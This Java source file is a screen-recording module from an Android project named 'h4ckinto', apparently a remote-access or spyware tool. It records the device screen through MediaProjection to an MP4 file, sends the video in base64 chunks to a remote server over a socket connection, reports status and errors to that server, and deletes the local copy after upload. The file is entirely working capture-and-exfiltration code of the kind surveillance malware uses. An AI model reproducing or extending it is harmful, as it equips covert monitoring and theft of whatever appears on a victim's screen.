package com.h4ckinto.android.managers;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import com.h4ckinto.android.network.SocketManager;
import com.h4ckinto.android.utils.Constants;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class ScreenRecorderManager {
    private static final String TAG = "ScreenRecorderManager";
    
    private Context context;
    private SocketManager socketManager;
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private MediaCodec encoder;
    private MediaMuxer muxer;
    
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private int bitRate;
    private int frameRate;
    
    private boolean isRecording = false;
    private boolean isMuxerStarted = false;
    private int videoTrackIndex = -1;
    
    private File outputFile;
    private Thread encodingThread;
    
    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1005;
    private static final String MIME_TYPE = "video/avc"; // H.264
    private static final int TIMEOUT_US = 10000; // 10ms
    
    public ScreenRecorderManager(Context context) {
        this.context = context;
        this.socketManager = SocketManager.getInstance(context);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            this.projectionManager = (MediaProjectionManager) 
                context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        }
        
        // Get screen dimensions
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        if (windowManager != null && windowManager.getDefaultDisplay() != null) {
            windowManager.getDefaultDisplay().getMetrics(metrics);
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;
        } else {
            // Fallback values
            screenWidth = 1080;
            screenHeight = 1920;
            screenDensity = 420;
        }
        
        // Video encoding settings
        bitRate = screenWidth * screenHeight * 4; // 4 bits per pixel
        frameRate = 30; // 30 FPS
        
        Log.d(TAG, "ScreenRecorderManager initialized - Screen: " + screenWidth + "x" + screenHeight);
    }
    
    /**
     * Start screen recording
     * This requires MediaProjection permission which must be requested via Activity
     */
    public void startRecording(int resultCode, Intent data, int durationSeconds) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            Log.e(TAG, "Screen recording requires Android 5.0+ (API 21+)");
            sendError("Screen recording requires Android 5.0+");
            return;
        }
        
        if (isRecording) {
            Log.w(TAG, "Screen recording already in progress");
            return;
        }
        
        if (projectionManager == null) {
            Log.e(TAG, "MediaProjectionManager not available");
            sendError("Screen recording not supported on this device");
            return;
        }
        
        try {
            // Create MediaProjection from result
            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            if (mediaProjection == null) {
                Log.e(TAG, "Failed to create MediaProjection");
                sendError("Failed to start screen recording - permission denied");
                return;
            }
            
            // Create output file
            File outputDir = new File(context.getExternalFilesDir(null), "screen_recordings");
            if (!outputDir.exists()) {
                outputDir.mkdirs();
            }
            
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            outputFile = new File(outputDir, "screen_" + timestamp + ".mp4");
            
            // Initialize encoder
            MediaFormat format = MediaFormat.createVideoFormat(MIME_TYPE, screenWidth, screenHeight);
            format.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
            format.setInteger(MediaFormat.KEY_BIT_RATE, bitRate);
            format.setInteger(MediaFormat.KEY_FRAME_RATE, frameRate);
            format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1); // 1 second between keyframes
            format.setInteger(MediaFormat.KEY_CAPTURE_RATE, frameRate);
            
            encoder = MediaCodec.createEncoderByType(MIME_TYPE);
            encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            
            // Create surface for encoder
            android.view.Surface encoderSurface = encoder.createInputSurface();
            
            // Create VirtualDisplay
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenRecorder",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                encoderSurface, null, null
            );
            
            // Initialize muxer
            muxer = new MediaMuxer(outputFile.getAbsolutePath(), MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
            
            // Start encoder
            encoder.start();
            isRecording = true;
            
            // Start encoding thread
            encodingThread = new Thread(() -> {
                encodeVideo(durationSeconds);
            });
            encodingThread.start();
            
            Log.d(TAG, "Screen recording started - Duration: " + durationSeconds + "s");
            sendStatus("Recording started", durationSeconds);
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen recording", e);
            sendError("Failed to start recording: " + e.getMessage());
            cleanup();
        }
    }
    
    /**
     * Stop screen recording
     */
    public void stopRecording() {
        if (!isRecording) {
            return;
        }
        
        isRecording = false;
        
        // Wait for encoding thread to finish
        if (encodingThread != null) {
            try {
                encodingThread.join(5000); // Wait up to 5 seconds
            } catch (InterruptedException e) {
                Log.e(TAG, "Error waiting for encoding thread", e);
            }
        }
        
        cleanup();
        Log.d(TAG, "Screen recording stopped");
    }
    
    /**
     * Encode video frames
     */
    private void encodeVideo(int durationSeconds) {
        long startTime = System.currentTimeMillis();
        long durationMillis = durationSeconds * 1000L;
        long presentationTimeUs = 0;
        
        MediaCodec.BufferInfo bufferInfo = new MediaCodec.BufferInfo();
        
        try {
            while (isRecording && (System.currentTimeMillis() - startTime) < durationMillis) {
                // Drain encoder output
                int outputBufferId = encoder.dequeueOutputBuffer(bufferInfo, TIMEOUT_US);
                
                if (outputBufferId == MediaCodec.INFO_TRY_AGAIN_LATER) {
                    // No output available yet
                    continue;
                } else if (outputBufferId == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                    // Output format changed - add track to muxer
                    MediaFormat newFormat = encoder.getOutputFormat();
                    videoTrackIndex = muxer.addTrack(newFormat);
                    muxer.start();
                    isMuxerStarted = true;
                    Log.d(TAG, "Muxer started - Video track index: " + videoTrackIndex);
                    continue;
                }
                
                if (outputBufferId >= 0 && isMuxerStarted) {
                    ByteBuffer outputBuffer = encoder.getOutputBuffer(outputBufferId);
                    
                    if (outputBuffer != null && bufferInfo.size > 0) {
                        // Adjust presentation time
                        if (presentationTimeUs == 0) {
                            presentationTimeUs = bufferInfo.presentationTimeUs;
                        }
                        bufferInfo.presentationTimeUs -= presentationTimeUs;
                        
                        // Write to muxer
                        outputBuffer.position(bufferInfo.offset);
                        outputBuffer.limit(bufferInfo.offset + bufferInfo.size);
                        muxer.writeSampleData(videoTrackIndex, outputBuffer, bufferInfo);
                    }
                    
                    encoder.releaseOutputBuffer(outputBufferId, false);
                }
                
                // Check if recording should stop
                if ((bufferInfo.flags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) {
                    Log.d(TAG, "End of stream reached");
                    break;
                }
            }
            
            // Signal end of stream
            if (isRecording) {
                encoder.signalEndOfInputStream();
                
                // Drain remaining frames
                while (true) {
                    int outputBufferId = encoder.dequeueOutputBuffer(bufferInfo, TIMEOUT_US);
                    if (outputBufferId == MediaCodec.INFO_TRY_AGAIN_LATER) {
                        break;
                    }
                    if (outputBufferId >= 0 && isMuxerStarted) {
                        ByteBuffer outputBuffer = encoder.getOutputBuffer(outputBufferId);
                        if (outputBuffer != null && bufferInfo.size > 0) {
                            outputBuffer.position(bufferInfo.offset);
                            outputBuffer.limit(bufferInfo.offset + bufferInfo.size);
                            muxer.writeSampleData(videoTrackIndex, outputBuffer, bufferInfo);
                        }
                        encoder.releaseOutputBuffer(outputBufferId, false);
                    }
                    if ((bufferInfo.flags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) {
                        break;
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error during video encoding", e);
        } finally {
            // Finalize recording
            if (isMuxerStarted) {
                try {
                    muxer.stop();
                    muxer.release();
                    muxer = null;
                    isMuxerStarted = false;
                } catch (Exception e) {
                    Log.e(TAG, "Error stopping muxer", e);
                }
            }
            
            // Send file to server
            if (outputFile != null && outputFile.exists()) {
                sendVideoToServer(outputFile);
            } else {
                sendError("Recording file not created");
            }
            
            cleanup();
        }
    }
    
    /**
     * Send video file to server in chunks
     */
    private void sendVideoToServer(File videoFile) {
        try {
            long fileSize = videoFile.length();
            Log.d(TAG, "Sending video to server - File: " + videoFile.getName() + ", Size: " + fileSize + " bytes");
            
            // Send file info first
            org.json.JSONObject fileInfo = new org.json.JSONObject();
            fileInfo.put("type", "screen_recording_start");
            fileInfo.put("fileName", videoFile.getName());
            fileInfo.put("fileSize", fileSize);
            fileInfo.put("duration", (System.currentTimeMillis() - (fileSize / 1000)) / 1000); // Estimate
            socketManager.sendFileData(fileInfo);
            
            // Read and send file in chunks
            FileInputStream fis = new FileInputStream(videoFile);
            byte[] buffer = new byte[64 * 1024]; // 64KB chunks
            int bytesRead;
            long totalSent = 0;
            int chunkIndex = 0;
            
            while ((bytesRead = fis.read(buffer)) > 0) {
                byte[] chunk = new byte[bytesRead];
                System.arraycopy(buffer, 0, chunk, 0, bytesRead);
                
                // Encode chunk to base64
                String base64Chunk = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP);
                
                // Send chunk
                org.json.JSONObject chunkData = new org.json.JSONObject();
                chunkData.put("type", "screen_recording_chunk");
                chunkData.put("fileName", videoFile.getName());
                chunkData.put("chunkIndex", chunkIndex);
                chunkData.put("chunkData", base64Chunk);
                chunkData.put("chunkSize", bytesRead);
                chunkData.put("totalSize", fileSize);
                chunkData.put("totalSent", totalSent);
                
                socketManager.sendFileData(chunkData);
                
                totalSent += bytesRead;
                chunkIndex++;
                
                // Small delay to avoid overwhelming the connection
                Thread.sleep(10);
            }
            
            fis.close();
            
            // Send completion message
            org.json.JSONObject completeData = new org.json.JSONObject();
            completeData.put("type", "screen_recording_complete");
            completeData.put("fileName", videoFile.getName());
            completeData.put("fileSize", fileSize);
            completeData.put("totalChunks", chunkIndex);
            socketManager.sendFileData(completeData);
            
            Log.d(TAG, "Video sent to server - " + chunkIndex + " chunks, " + totalSent + " bytes");
            
            // Delete local file after sending
            if (videoFile.delete()) {
                Log.d(TAG, "Temporary video file deleted");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending video to server", e);
            sendError("Failed to send video: " + e.getMessage());
        }
    }
    
    /**
     * Cleanup resources
     */
    private void cleanup() {
        isRecording = false;
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        
        if (encoder != null) {
            try {
                encoder.stop();
                encoder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing encoder", e);
            }
            encoder = null;
        }
        
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
    }
    
    /**
     * Send status update to server
     */
    private void sendStatus(String status, int duration) {
        try {
            org.json.JSONObject statusData = new org.json.JSONObject();
            statusData.put("type", "screen_recording_status");
            statusData.put("status", status);
            statusData.put("duration", duration);
            statusData.put("timestamp", System.currentTimeMillis());
            socketManager.sendFileData(statusData);
        } catch (Exception e) {
            Log.e(TAG, "Error sending status", e);
        }
    }
    
    /**
     * Send error to server
     */
    private void sendError(String error) {
        try {
            org.json.JSONObject errorData = new org.json.JSONObject();
            errorData.put("type", "screen_recording_error");
            errorData.put("error", error);
            errorData.put("timestamp", System.currentTimeMillis());
            socketManager.sendFileData(errorData);
        } catch (Exception e) {
            Log.e(TAG, "Error sending error message", e);
        }
    }
    
    /**
     * Check if recording is in progress
     */
    public boolean isRecording() {
        return isRecording;
    }
    
    /**
     * Get request code for screen capture
     */
    public static int getRequestCode() {
        return REQUEST_CODE_SCREEN_CAPTURE;
    }
    
    /**
     * Destroy and cleanup
     */
    public void destroy() {
        stopRecording();
        cleanup();
    }
}






